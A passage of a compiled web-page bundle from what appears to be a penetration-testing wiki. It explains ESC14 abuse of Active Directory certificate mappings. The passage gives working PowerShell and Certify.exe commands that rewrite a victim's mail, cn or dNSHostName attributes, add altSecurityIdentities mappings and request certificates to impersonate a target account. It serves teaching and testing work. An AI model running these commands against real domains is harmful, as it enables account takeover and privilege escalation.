.\\cert"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"a.pem .\\cert"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"a.pfx")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"certutil "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Dump "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"v .\\cert"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"a.pfx")])])])],-1),i("p",null,[e("Following this, the "),i("a",{href:"https://github.com/JonasBK/Powershell/blob/master/Get-X509IssuerSerialNumberFormat.ps1",target:"_blank",rel:"noreferrer"},"Get-X509IssuerSerialNumberFormat"),e(" script (PowerShell) allows to craft a X509IssuerSerialNumber mapping string well formated.")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Get-X509IssuerSerialNumberFormat"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"SerialNumber $SERIAL_NUMBER "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"IssuerDistinguishedName $ISSUER_DN")])])])],-1),i("p",null,[e("Finally, the crafted string can be added to "),i("code",null,"altSecurityIdentities"),e(" target's attribute with the "),i("a",{href:"https://github.com/JonasBK/Powershell/blob/master/Add-AltSecIDMapping.ps1",target:"_blank",rel:"noreferrer"},"Add-AltSecIDMapping"),e(" script (PowerShell).")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Add-AltSecIDMapping"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"DistinguishedName $TARGET_DN "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"MappingString $MAPPING_STRING")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Get-AltSecIDMapping"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"DistinguishedName $TARGET_DN")])])])],-1),i("p",null,[e("The certificate requested at the begining can then be used with "),i("a",{href:"./../kerberos/pass-the-certificate"},"Pass-the-Certificate"),e(" to obtain a TGT and authenticate as the target.")],-1),i("p",null,[e("The certificate mapping written can be cleaned with "),i("a",{href:"https://github.com/JonasBK/Powershell/blob/master/Remove-AltSecIDMapping.ps1",target:"_blank",rel:"noreferrer"},"Remove-AltSecIDMapping"),e(" (PowerShell).")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Remove-AltSecIDMapping"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"DistinguishedName $TARGET_DN "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"MappingString $MAPPING_STRING")])])])],-1)])),_:1})]),_:1}),s[34]||(s[34]=i("h4",{id:"esc14-b-target-with-x509rfc822-email",tabindex:"-1"},[e("(ESC14 B) Target with X509RFC822 (email) "),i("a",{class:"header-anchor",href:"#esc14-b-target-with-x509rfc822-email","aria-label":'Permalink to "(ESC14 B) Target with X509RFC822 (email)"'},"​")],-1)),s[35]||(s[35]=i("p",null,[e("The target has an explicit weak mapping of type "),i("code",null,"X509RFC822"),e(". The attacker can modify the "),i("code",null,"mail"),e(" attribute of the victim so that it matches the "),i("code",null,"X509RFC822"),e(" mapping of the target. It is then possible to enroll on the certificate model with the victim, and use the certificate obtained to authenticate as the target.")],-1)),s[36]||(s[36]=i("p",null,"For this attack, a few additional prerequisites are necessary:",-1)),i("div",E,[s[18]||(s[18]=n('<p class="custom-block-title">WARNING</p><div class="warning custom-block"><p></p><ul><li>The target is a user account</li><li>The target already has at least one <code>X509RFC822</code> mapping in <code>altSecurityIdentities</code></li><li>The attacker has write access to the <code>mail</code> attribute of the victim</li><li>The certificate template shows <code>CT_FLAG_NO_SECURITY_EXTENSION</code> in <code>msPKI-Enrollment-Flag</code> and shows the attribute <code>CT_FLAG_SUBJECT_ALT_REQUIRE_EMAIL</code> in <code>msPKI-Certificate-Name-Flag</code></li><li>For PKINIT, <code>StrongCertificateBindingEnforcement</code> is set to <code>0</code> or <code>1</code></li><li>For Schannel, <code>CertificateMappingMethods</code> indicates <code>0x8</code> and <code>StrongCertificateBindingEnforcement</code> is set to <code>0</code> or <code>1</code></li></ul></div>',2)),t(h,null,{default:a(()=>[t(l,{label:"UNIX-like"},{default:a(()=>s[16]||(s[16]=[i("p",null,"// TODO",-1)])),_:1}),t(l,{label:"Windows"},{default:a(()=>s[17]||(s[17]=[i("p",null,[e("From Windows systems, with PowerShell the "),i("code",null,"mail"),e(" attribute of the victim must be overwritten to match the email indicates in the "),i("code",null,"X509RFC822"),e(" mapping of the target.")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$victim "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," ["),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"ADSI"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"]"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"LDAP://'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$VICTIM_DN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"')]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$victim.Properties["),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"mail"'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"].Value "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $TARGET_EMAIL")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$victim.CommitChanges()")])])])],-1),i("p",null,[e("Then, "),i("a",{href:"https://github.com/GhostPack/Certify",target:"_blank",rel:"noreferrer"},"Certify"),e(" (C#) can be used to enroll on a certificate template from the victim session.")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Certify.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," request "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ca:domain\\ca "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"template:$TEMPLATE_MAIL")])])])],-1),i("p",null,[e("The certificate can then be used with "),i("a",{href:"./../kerberos/pass-the-certificate"},"Pass-the-Certificate"),e(" to obtain a TGT and authenticate as the target.")],-1)])),_:1})]),_:1})]),s[37]||(s[37]=n('<h4 id="esc14-c-target-with-x509issuersubject" tabindex="-1">(ESC14 C) Target with X509IssuerSubject <a class="header-anchor" href="#esc14-c-target-with-x509issuersubject" aria-label="Permalink to &quot;(ESC14 C) Target with X509IssuerSubject&quot;">​</a></h4><p>The target has an explicit weak mapping of type <code>X509IssuerSubject</code>. The attacker can modify the <code>cn</code> or <code>dNSHostName</code> attribute of the victim to match the subject of the <code>X509IssuerSubject</code> mapping of the target. It is then possible to enroll on the certificate template with the victim, and use the resulting certificate to authenticate as the target.</p><p>For this attack, <em>some</em> additional prerequisites are necessary:</p><div class="warning custom-block"><p></p><ul><li>The target already has at least one <code>X509IssuerSubject</code> mapping in <code>altSecurityIdentities</code></li><li>If the victim is a user:</li><li>The attacker can modify the <code>cn</code> and <code>name</code> attributes of the victim (to change the <code>cn</code>, the <code>name</code> must match)</li><li>If the target is a user and the <code>X509IssuerSubject</code> mapping has the current value of the <code>cn</code> attribute of the target as its identifier, the victim and the target cannot be in the same container (the DC will not allow the <code>cn</code> of the victim to be set according to the <code>cn</code> of the target if they are in the same container, as this would mean that they have the same <code>distinguishedName</code>)</li><li>If the victim is a machine: the attacker has write access to the <code>dNSHostName</code> attribute</li><li>The certificate template indicates <code>CT_FLAG_NO_SECURITY_EXTENSION</code> in <code>msPKI-Enrollment-Flag</code> (except for Schannel authentication with the DC having the <code>CertificateMappingMethods</code> key set to <code>0x1</code>)</li><li>The template has one of the following flags in <code>msPKI-Certificate-Name-Flag</code>: <code>CT_FLAG_SUBJECT_REQUIRE_COMMON_NAME</code> or <code>CT_FLAG_SUBJECT_REQUIRE_DNS_AS_CN</code></li><li>The certificate does not have any of the following flags: <code>CT_FLAG_SUBJECT_REQUIRE_DIRECTORY_PATH</code> and <code>CT_FLAG_SUBJECT_REQUIRE_EMAIL</code></li><li>The enterprise PKI is the issuer referenced by <code>IssuerName</code> in the <code>X509IssuerSubject</code> mapping of the target</li><li>For PKINIT, <code>StrongCertificateBindingEnforcement</code> is set to <code>0</code> or <code>1</code></li><li>For Schannel, <code>CertificateMappingMethods</code> indicates <code>0x8</code> and <code>StrongCertificateBindingEnforcement</code> is set to <code>0</code> or <code>1</code>, or <code>CertificateMappingMethods</code> is set to <code>0x1</code></li></ul></div><p>In this example, the target has the explicit mapping value <code>X509:&lt;I&gt;DC=local,DC=domain,CN=$TARGET&lt;S&gt;CN=$TARGET.domain.local</code>. One must change the <code>cn</code> of the victim (in this case a user) to equal <code>$TARGET.domain.local</code>. By renaming the user, the DC will automatically change the <code>cn</code> and <code>name</code>.</p>',5)),t(h,null,{default:a(()=>[t(l,{label:"UNIX-like"},{default:a(()=>s[19]||(s[19]=[i("p",null,"// TODO",-1)])),_:1}),t(l,{label:"Windows"},{default:a(()=>s[20]||(s[20]=[i("p",null,[e("From Windows systems, with PowerShell the "),i("code",null,"cn"),e(" attribute of the victim must be overwritten to be equal to "),i("code",null,"$TARGET.domain.local"),e(".")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$victim "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," ["),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"ADSI"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"]"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"LDAP://CN='),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$VICTIM"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},',CN=Users,DC=domain,DC=local"')]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$victim.Rename("),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"CN='),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$TARGET"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'.domain.local"'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},")")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Get-ADUser"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $VICTIM")])])])],-1),i("p",null,[e("Then, "),i("a",{href:"https://github.com/GhostPack/Certify",target:"_blank",rel:"noreferrer"},"Certify"),e(" (C#) can be used to enroll on a certificate template from the victim session.")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Certify.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," request "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ca:domain\\ca "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"template:$TEMPLATE")])])])],-1),i("p",null,[e("The certificate can then be used with "),i("a",{href:"./../kerberos/pass-the-certificate"},"Pass-the-Certificate"),e(" to obtain a TGT and authenticate as the target.")],-1)])),_:1})]),_:1}),s[38]||(s[38]=n('<h4 id="esc14-d-target-with-x509subjectonly" tabindex="-1">(ESC14 D) Target with X509SubjectOnly <a class="header-anchor" href="#esc14-d-target-with-x509subjectonly" aria-label="Permalink to &quot;(ESC14 D) Target with X509SubjectOnly&quot;">​</a></h4><p>The target has an explicit weak mapping of type <code>X509SubjectOnly</code>. The attacker can modify the <code>cn</code> or <code>dNSHostName</code> attribute of the victim to match the subject of the <code>X509SubjectOnly</code> mapping of the target. It is then possible to enroll on the certificate template with the victim, and use the resulting certificate to authenticate as the target.</p><p>For this attack, <em>some</em> additional prerequisites are necessary:</p><div class="warning custom-block"><p></p><ul><li>The target already has at least one <code>X509SubjectOnly</code> mapping in <code>altSecurityIdentities</code></li><li>If the victim is a user:</li><li>The attacker can modify the <code>cn</code> and <code>name</code> attributes of the victim (to change the <code>cn</code>, the <code>name</code> must match)</li><li>If the target is a user and the <code>X509SubjectOnly</code> mapping has the current value of the <code>cn</code> attribute of the target as its identifier, the victim and the target cannot be in the same container (the DC will not allow the <code>cn</code> of the victim to be set according to the <code>cn</code> of the target if they are in the same container, as this would mean that they have the same <code>distinguishedName</code>)</li><li>If the victim is a machine: the attacker has write access to the <code>dNSHostName</code> attribute</li><li>The certificate template indicates <code>CT_FLAG_NO_SECURITY_EXTENSION</code> in <code>msPKI-Enrollment-Flag</code></li><li>The template has one of the following flags in <code>msPKI-Certificate-Name-Flag</code>: <code>CT_FLAG_SUBJECT_REQUIRE_COMMON_NAME</code> or <code>CT_FLAG_SUBJECT_REQUIRE_DNS_AS_CN</code></li><li>The certificate does not have any of the following flags: <code>CT_FLAG_SUBJECT_REQUIRE_DIRECTORY_PATH</code> and <code>CT_FLAG_SUBJECT_REQUIRE_EMAIL</code></li><li>For PKINIT, <code>StrongCertificateBindingEnforcement</code> is set to <code>0</code> or <code>1</code></li><li>For Schannel, <code>CertificateMappingMethods</code> indicates <code>0x8</code> and <code>StrongCertificateBindingEnforcement</code> is set to <code>0</code> or <code>1</code></li></ul></div><p>In this example, the target has the explicit mapping value <code>X509:&lt;S&gt;CN=TARGET</code>. One must change the <code>dNSHostName</code> of the victim (in this case a computer) to equal <code>$TARGET</code>.</p>',5)),t(h,null,{default:a(()=>[t(l,{label:"UNIX-like"},{default:a(()=>s[21]||(s[21]=[i("p",null,"// TODO",-1)])),_:1}),t(l,{label:"Windows"},{default:a(()=>s[22]||(s[22]=[i("p",null,[e("From Windows systems, with PowerShell the "),i("code",null,"cn"),e(" attribute of the victim must be overwritten to be equal to "),i("code",null,"$TARGET.domain.local"),e(".")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$victim "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," ["),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"ADSI"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"]"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"LDAP://CN='),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$VICTIM"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},',CN=Computers,DC=domain,DC=local"')]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$victim.Properties["),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"dNSHostName"'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"].Value "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $TARGET")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$victim.CommitChanges()")])])])],-1),i("p",null,[e("Then, "),i("a",{href:"https://github.com/GhostPack/Certify",target:"_blank",rel:"noreferrer"},"Certify"),e(" (C#) can be used to enroll on a certificate template from the victim session.")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Certify.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," request "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ca:domain\\ca "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"template:$TEMPLATE "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"machine")])])])],-1),i("p",null,[e("The certificate can then be used with "),i("a",{href:"./../kerberos/pass-the-certificate"},"Pass-the-Certificate"),e(" to obtain a TGT and authenticate as the target.")],-1)])),_:1})]),_:1}),s[39]||(s[39]=n('<h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2" target="_blank" rel="noreferrer">https://posts.specterops.io/certified-pre-owned-d95910965cd2</a></p><p><a href="https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6" target="_blank" rel="noreferrer">https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6</a></p><p><a href="https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7" target="_blank" rel="noreferrer">https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7</a></p><p><a href="https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53" target="_blank" rel="noreferrer">https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53</a></p><p><a href="https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9" target="_blank" rel="noreferrer">https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9</a></p>',6))])}const w=o(u,[["render",F]]);export{v as __pageData,w as default};
